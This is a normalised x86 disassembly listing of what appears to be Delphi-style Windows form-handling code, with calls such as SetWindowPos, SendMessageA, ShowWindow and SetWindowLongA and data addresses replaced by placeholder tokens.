mov eax [ rw-data ]
call sub_46aacc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44c2bc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_46aa9c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_46766c
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_46766c
jmp r-xdata
sub_469669
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46d0dc
call sub_403af0
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4683bc
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_450610
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4530b8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469764
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4530b8
call sub_463fe4
mov ebx eax
sub_4697b0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_469808
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4242d0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_469866
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_469874
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_4034a4
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4698a0
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_46d0c8
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_4034a4
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_469a40
jmp r-xdata
mov eax ebx
call sub_469adc
mov dl 0x1
mov eax ebx
call sub_46762c
jmp r-xdata
sub_469944
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_466fb8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_467004
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_4699a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403788#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_4034a4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_469adc
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_469a60
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_469ace
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469ad5
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_4682b8
sub_469af8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_469dc0
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_44b0ac
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_46c03c
xor edx edx
push ebp
push sub_469da3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_418950
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_46b010
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_463e94
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_469d81
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_469a48
xor edx edx
push ebp
push sub_469ce0
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4699a8
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_46ce48
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_4530b8
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469ce7
mov eax [ ebp - 0x4 ]
call sub_469a40
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_469ce7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469d8b
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46b010
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_46b010
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_4188cc
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_418a70
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_463f48
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_469dd0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44fde8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_469dd0
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44fdac
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_469e40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_469dd0
pop ecx
mov eax [ esi + 0x34 ]
call sub_45f130
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_45f140
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_469ec4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451408
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_4034a4
sub_469ee8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_4034a4
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_469f18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44fde8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_469ee8
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_469f18
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44fdac
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_469f94
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_469ee8
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_469ee8
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_469f18
pop ecx
test al al
je r-xdata
sub_469fe8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_4034a4
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_46a018
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_44fde8
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_469fe8
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46a018
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44fdac
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a094
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_469fe8
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_469fe8
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_46a018
pop ecx
test al al
je r-xdata
sub_46a0e8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_4188d4
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_4590b4
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_46a13c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_46a0e8
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_4034a4
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a1b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_4216ec
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_46a1f4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_44cd58
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_44da78
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46a23c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4533bc
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_4530b8
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_4530b8
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_4530b8
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_4530b8
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_4530b8
push eax
call RedrawWindow
sub_46a390
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_465140
mov dl 0x5
mov eax ebx
call sub_466eb4
mov dl 0x1
mov eax ebx
call sub_451c94
mov dl 0x3
mov eax ebx
call sub_4671b0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_46a3f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46a4cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_451b54
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4519c0
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_44bd60
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c7e8
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_404128
mov eax [ ebp - 0xc ]
call sub_4042f8
push eax
mov eax [ ebp - 0xc ]
call sub_4044f8
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_44c7f8
mov eax [ ebp - 0xc ]
call sub_4042f8
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a4d6
lea eax [ ebp - 0xc ]
call sub_404038
retn
mov dl 0x1
mov eax esi
call sub_466534
mov edx [ ebp - 0xc ]
mov eax esi
call sub_44c8a4
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_404684
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_46a4fc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_44fde8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_465c58
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_44fdac
mov edx ebx
pop ecx
mov si 0xffcc
call sub_4034a4
inc ebp
dec edi
jne r-xdata
sub_46a548
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_451b54
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_46a574
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45235c
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_46a59c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_468904
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4530b8
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_451b54
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4530b8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4530b8
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_451b68
or ecx 0xffffffff
mov dl 0x1
call sub_44cf6c
pop esi
pop ebx
retn
sub_46a634
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4527cc
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_44da78
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_44c214
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_4034a4
sub_46a68c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46a752
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_44c7e8
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404128
mov eax [ ebp - 0x4 ]
call sub_4042f8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044f8
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_44c7f8
mov eax [ ebp - 0x4 ]
call sub_4042f8
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_44c8a4
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a759
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_466534
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_404684
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_46a778
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_45254c
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_451b54
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_451b68
mov dl [ ebx + 0x57 ]
call sub_44c794
inc edi
dec esi
jne r-xdata
sub_46a81c
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_46a84c
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
